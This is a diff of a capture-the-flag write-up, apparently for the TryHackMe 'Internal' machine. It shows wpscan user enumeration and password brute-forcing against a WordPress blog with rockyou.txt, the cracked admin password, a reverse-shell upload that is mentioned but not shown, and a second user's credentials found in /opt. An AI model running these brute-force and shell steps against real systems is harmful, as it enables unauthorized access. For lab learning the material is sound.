@@ -50,12 +50,26 @@ Tried every exploit on metasploit as follows, but they didn't work.
 	8  exploit/multi/http/phpmyadmin_preg_replace            2013-04-25       excellent  Yes    phpMyAdmin Authenticated Remote Code Execution via preg_replace()
 
 Scanned $TARGET_IP/blog using wordpress scanning tool, wpscan  
-	```wpscan --url 10.10.111.161/blog -e vp,u```
+	```wpscan --url 10.10.111.161/blog -e vp,u```  
 	One user found: admin  
 
 Using this info, bruteforced passwords  
-	```wpscan --url 10.10.111.161/blog --usernames admin --passwords /usr/share/wordlists/rockyou.txt --max-threads 50```
+	```wpscan --url 10.10.111.161/blog --usernames admin --passwords /usr/share/wordlists/rockyou.txt --max-threads 50```  
 	Password Cracked: Username: admin, Password: my2boys  
 
 Modifyied /etc/hosts to help resolve name(internal.thm --> $TARGET_IP)  
 
+Uploaded a reverse shell to wordpress, and got a reverse shell.  
+Then, I found an interesting file in /opt directory.  
+```
+	$ cd /opt
+	$ ls
+	containerd
+	wp-save.txt
+	$ cat wp-save.txt
+	Bill,
+
+	Aubreanna needed these credentials for something later.  Let her know you have them and where they are.
+```
+
+	aubreanna:bubb13guM!@#123
